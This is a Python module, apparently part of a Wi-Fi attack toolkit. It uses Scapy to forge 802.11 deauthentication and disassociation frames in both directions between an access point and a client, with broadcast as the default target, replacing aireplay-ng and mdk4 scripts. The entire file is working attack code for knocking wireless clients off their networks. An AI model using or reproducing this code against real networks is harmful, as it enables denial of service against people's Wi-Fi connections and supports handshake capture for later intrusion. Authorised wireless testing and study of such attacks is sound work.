"""Scapy-based deauthentication/disassociation frames, replacing
scripts/deAuth.sh (aireplay-ng --deauth) and scripts/deAss.sh (mdk4 'd' mode).

802.11 has two distinct management frames for kicking a client:
- Deauthentication (subtype 12)
- Disassociation   (subtype 10)

Both are sent in both directions (AP -> client and client -> AP) so that
either end of the connection tears down, matching aireplay-ng's behavior.
"""

from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas, RadioTap
from scapy.sendrecv import sendp

from core import device

BROADCAST = "FF:FF:FF:FF:FF:FF"
DEFAULT_REASON = 7  # "Class 3 frame received from a nonassociated station"

_DEAUTH_SUBTYPE = 12
_DISASSOC_SUBTYPE = 10


class NotInMonitorModeError(RuntimeError):
    """Raised when a packet operation requires monitor mode but the interface isn't in it."""


def _require_monitor_mode(iface: str) -> None:
    mode = device.get_mode(iface)
    if mode.lower() != "monitor":
        raise NotInMonitorModeError(
            f"Interface '{iface}' must be in monitor mode to send this frame "
            f"(current mode: {mode})."
        )


def _build_frames(bssid: str, client_mac: str, subtype: int, layer, reason: int) -> list:
    """Builds the AP->client and client->AP variants of a management frame."""
    to_client = RadioTap() / Dot11(
        type=0, subtype=subtype, addr1=client_mac, addr2=bssid, addr3=bssid
    ) / layer(reason=reason)
    to_ap = RadioTap() / Dot11(
        type=0, subtype=subtype, addr1=bssid, addr2=client_mac, addr3=bssid
    ) / layer(reason=reason)
    return [to_client, to_ap]


def send_deauth(
    iface: str,
    bssid: str,
    client_mac: str = BROADCAST,
    count: int = 1,
    reason: int = DEFAULT_REASON,
) -> None:
    """Sends Deauthentication frames between `bssid` and `client_mac` (or broadcast)."""
    _require_monitor_mode(iface)
    for frame in _build_frames(bssid, client_mac, _DEAUTH_SUBTYPE, Dot11Deauth, reason):
        sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)


def send_disassoc(
    iface: str,
    bssid: str,
    client_mac: str = BROADCAST,
    count: int = 1,
    reason: int = DEFAULT_REASON,
) -> None:
    """Sends Disassociation frames between `bssid` and `client_mac` (or broadcast)."""
    _require_monitor_mode(iface)
    for frame in _build_frames(bssid, client_mac, _DISASSOC_SUBTYPE, Dot11Disas, reason):
        sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
